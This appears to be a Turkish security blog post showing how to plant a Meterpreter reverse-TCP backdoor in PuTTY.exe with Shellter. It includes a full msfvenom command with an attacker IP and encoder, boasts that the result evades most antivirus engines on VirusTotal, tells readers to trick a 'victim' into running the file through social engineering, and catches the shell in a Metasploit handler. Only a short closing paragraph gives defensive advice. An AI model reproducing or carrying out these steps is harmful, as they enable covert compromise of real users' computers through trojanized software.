---
layout: post
title: Shellter ile Backdoor Hazırlama ve  Sisteme Sızma
date: 2017-01-12 14:42
author: ahmetgurel
comments: true
categories: [backdoor, backdoor hazırlama, Genel Güvenlik, msfvenom, msfvenom backdoor, shellter, Shellter ile Backdoor Hazırlama ve Sisteme Sızma, Siber Güvenlik, sisteme sızma, Sızma Testi Araçları (Pentest Tools), windows hack]
---
Merhaba,

Bu yazımda bir sisteme sızmak için kullanılan güzel bir yöntemden bahsedeceğim.Sistemde yazılımsal açıklıklardan yararlanmak yerine zararlı bir dosya ile sisteme sızabilirsiniz.Bu zararlı dosyayı bir çok farklı yolla oluşturabilirsiniz.Bilginiz ölçüsünde kendiniz yazabilirsiniz,msfvenom ile kendiniz bir zararlı uygulama oluşturabilirsiniz ya da her hangi bir uygulamaya payload yerleştirebilirsiniz.

Bugün biz bunu yapacağız windowsta ssh bağlantısı için kullanılan Putty.exe programına Payload yerleştirip bununla bir sisteme sızmayı anlatacağım.Bunun dışında msfvenom ile oluşturduğunuz uygulama -e parametresi ile encode ederek antivirüsleri geçmesini sağlanabiliyor fakat genelde bilindiği için bu encode ve payloadlar tamamen bypass etmek zor.
<pre class="lang:default decode:true ">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.237.128 LPORT=4444 -f exe -o /root/Desktop/zararli.exe  -e x86/shikata_ga_nai -i 20</pre>
Yukarıdaki msfvenom komutu ile haberleşeceği ip ve portu belirterek zararlı.exe  oluşturarak shikata_ga_nai ile 20 kere encode ettik.Fakat biz bu yazıda bu şekilde yapmayacağız bu ne kadar encode etsekde bir çok antivirüs hem yakalıyor hemde oluşturduğumu zararlı sadece siyah bir cmd ekranı açıyor buda kurbanın hemen kapatması ya da şüphelenerek silmesi anlamına gelmektedir.Bunun için putty.exe seçtik internettten putty.exe yi indirerek ona kendi payloadımızı yerleştireceğiz.Bu aşamadan sonra Sosyal Mühendislik ve diğer yolları kullanarak kurbanın uygulamayı çalıştırmasını sağlamalıyız.

Şimdi gelelim putty.exe ye Payloadımızı yerleştirmeye bunu yine msfvenom ile yapabilmekteyiz.Ya da bunun için başka bir alternatif olan Shellter uygulaması ile yapabilmekteyiz.Shellter windowsda çalışan bir uygulamadır fakat wine ile Linuxta çalıştırılmaktadır.<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a> adresinden uygulamayı indirebilirsiniz.<a href="http://www.putty.org/">http://www.putty.org/</a> adresindende putty.exe uygulamasını indirebilirsiniz.

Daha sonra aşağıdaki ekran görüntülerindeki gibi yerleştirilecek payload encoder haberleşilecel ip ve port bilgilerini shellter a girerek putty.exe artık bizim hazırladığımız backdoorumuz olacaktır.Her adım ekran görüntülerinde mevcuttur.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/WindowsXP-2017-01-12-14-20-22.png"><img class="alignnone size-large wp-image-658" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/WindowsXP-2017-01-12-14-20-22-1024x576.png" alt="" width="976" height="549" /></a>

&nbsp;

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/2.png"><img class="alignnone size-large wp-image-660" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/2-1024x576.png" alt="" width="976" height="549" /></a>

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/3.png"><img class="alignnone size-large wp-image-661" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/3-1024x576.png" alt="" width="976" height="549" /></a>

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/4.png"><img class="alignnone size-large wp-image-662" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/4-1024x576.png" alt="" width="976" height="549" /></a>

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/5.png"><img class="alignnone size-large wp-image-663" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/5-1024x576.png" alt="" width="976" height="549" /></a>

Artık backdoorumuz oluştu.Enter a basarak shellter kapanacaktır.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/virüs-total.jpg"><img class="alignnone size-full wp-image-664" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/virüs-total.jpg" alt="" width="974" height="254" /></a>

Oluşturduğumuz backdoor virustotal de kontrol ettiğimizde 57 antivirusden 10 tanesi yakayabildi.Bunların dışında bir çok popüler antivirus uygulaması yakayamadı.Özel bir işlem gerçekleştirmeden 47 tane antivirüsü geçmesi gayet başarılı bir sonuç bence shellter uygulaması bu konuda gayet başarılı başka encoder ve işlemler sonucu daha iyi sonuçlar elde edilecektir. NOT: Linux ortamında hazırlandığında daha az antivirus tarafından yakalanmaktadır.Daha iyi sonuçlar alabilirsiniz.

Bundan sonraki kısım oluşturduğumuz uygulamayı kurbanın çalıştırılması bir senaryo ile bu sağlanmalıdır.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-24-04.png"><img class="alignnone size-large wp-image-665" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-24-04-1024x576.png" alt="" width="976" height="549" /></a>

Metasploitimizi açarak multi handlerı açarak dinleme moduna geçiyoruz ve uygulama çalıştığı anda oturum elde etmeye çalışacağız.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-25-11.png"><img class="alignnone size-large wp-image-666" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-25-11-1024x576.png" alt="" width="976" height="549" /></a>

Artık her şey tamam sadece uygulayı kurbanımızın indirip çalıştırması gerekmektedir.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/WindowsXP-2017-01-12-14-25-18.png"><img class="alignnone size-large wp-image-667" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/WindowsXP-2017-01-12-14-25-18-1024x576.png" alt="" width="976" height="549" /></a>

Uygulamayı bu şekilde açıldıktan sonra backdoorumuzu oluştururken haberleşmesi için girdiğimiz ip ve port numaralarıyla haberleşecektir.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-25-23.png"><img class="alignnone size-large wp-image-668" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-25-23-1024x576.png" alt="" width="976" height="549" /></a>

Gördüğünüz üzere meterperter satırı ile oturum elde ettik.

<a href="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-25-33.png"><img class="alignnone size-large wp-image-669" src="http://www.gurelahmet.com/wp-content/uploads/2017/01/Kali-Linux-2.0.0-vm-amd64-2017-01-12-14-25-33-1024x576.png" alt="" width="976" height="549" /></a>

Bilgisayarda antivirus olmaması ya da gerçekleştirdiğimiz işlemler sonucunda bunu yakalayamayan bir antivirus programının hiç bir faydası olmayacaktır.Kurban putty ile ssh bağlanarak her zamanki işlemini yaparken bizde sisteme sızmış oluyoruz.Bunun için güncel bir antivirus kullanmanız bazı durumlarda işinize yarayacaktır.Bilmediğiniz kaynaklardan dosya indirmeyiniz indirdiysenizde kurmadan önce en azından virustotal e yükleyerek kontrol edebilirsiniz.Bu yazıda bende hazır windows xp vardı onu kullandım ama Windows7,10 hiç fark etmez aynı şekilde çalışacaktır.Başka bir yazıda görüşmek üzere her zaman sorularınız için info@gurelahmet.com mail adresinden bana ulaşabilirsiniz.

